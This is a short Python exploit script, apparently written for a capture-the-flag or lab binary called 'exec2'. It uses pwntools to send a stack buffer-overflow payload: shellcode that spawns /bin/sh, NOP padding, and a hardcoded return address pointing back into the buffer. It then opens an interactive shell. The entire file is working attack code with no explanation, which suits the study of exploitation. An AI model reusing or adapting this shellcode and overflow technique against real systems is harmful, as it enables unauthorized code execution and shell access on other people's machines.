from pwn import *

p = process("./exec2")

buf_addr = 0xffffd008
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

payload = b""
payload += shellcode
payload += b"\x90"*(0x34-len(shellcode))
payload += p32(buf_addr)

pause()
p.sendline(payload)

p.interactive()